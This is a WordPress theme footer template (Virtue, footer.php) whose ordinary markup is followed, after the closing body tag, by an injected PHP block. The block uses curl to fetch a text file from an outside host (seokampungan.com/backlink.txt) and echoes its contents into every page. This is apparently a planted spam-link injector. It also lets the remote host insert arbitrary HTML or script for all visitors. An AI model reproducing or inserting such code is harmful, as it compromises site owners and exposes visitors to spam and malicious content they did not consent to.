<?php
/**
 * Footer Template
 *
 * @version 3.2.5
 */

if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly
		

		/**
		* @hooked virtue_footer_markup - 10
		*/
		do_action( 'virtue_footer' );
		?>
		</div><!--Wrapper-->
		<?php wp_footer(); ?>
	</body>
<?php
$curl = curl_init(); 
$url = 'https://seokampungan.com/backlink.txt'; 
curl_setopt($curl, CURLOPT_URL, $url); 
curl_setopt($curl, CURLOPT_HEADER, 0); 
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); 
$result = curl_exec($curl); 
echo $result;
?>
</html>
